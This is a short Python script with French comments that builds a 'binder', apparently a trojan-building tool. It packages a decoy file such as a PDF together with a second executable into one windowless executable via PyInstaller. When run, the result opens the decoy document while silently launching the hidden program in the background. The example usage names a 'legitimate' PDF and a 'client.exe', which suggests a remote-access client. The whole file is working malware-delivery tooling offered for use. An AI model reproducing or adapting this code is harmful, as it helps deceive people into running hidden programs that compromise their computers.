import os
import subprocess
import shutil

def bind_files(input_pdf, input_exe, output_exe):
    """
    Combine l'ouverture d'un fichier (PDF, DOCX, ou TXT) avec l'exécution d'un .exe.

    :param input_pdf: Chemin vers le fichier légitime à afficher.
    :param input_exe: Chemin vers le fichier exécutable à exécuter.
    :param output_exe: Nom de l'exécutable final combiné.
    """
    # Crée un script temporaire
    binder_code = f"""
import os
import subprocess

def execute_and_show():
    # Fichier visible à afficher
    file_to_show = "{input_pdf}"
    # Fichier exécutable à lancer
    exe_to_run = "{input_exe}"
    
    # Ouvrir le fichier visible (PDF, DOCX, ou TXT)
    os.startfile(file_to_show)
    
    # Exécuter le fichier exécutable en arrière-plan
    subprocess.Popen(exe_to_run, shell=True)

if __name__ == "__main__":
    execute_and_show()
"""

    # Sauvegarder ce code temporairement
    temp_file = "temp_binder.py"
    with open(temp_file, "w") as f:
        f.write(binder_code)

    # Convertir le script temporaire en un exécutable
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "-n", output_exe, temp_file])

    # Nettoyer les fichiers temporaires générés par PyInstaller
    os.remove(temp_file)
    build_folder = "build"
    dist_folder = "dist"
    spec_file = f"{output_exe}.spec"

    # Supprimer les dossiers et fichiers inutiles
    if os.path.exists(build_folder):
        shutil.rmtree(build_folder)
    if os.path.exists(spec_file):
        os.remove(spec_file)

    print(f"Fichier combiné '{output_exe}.exe' généré avec succès dans le dossier {dist_folder}/")

# Exemple d'utilisation
if __name__ == "__main__":
    # Fichier visible
    input_pdf = "document_legitime.pdf"  # Le fichier que vous voulez afficher
    # Fichier exécutable à exécuter
    input_exe = "client.exe"  # Le fichier .exe généré depuis votre script Python
    # Nom de sortie
    output_exe = "fichier_combiné"

    # Créer l'exécutable combiné
    bind_files(input_pdf, input_exe, output_exe)
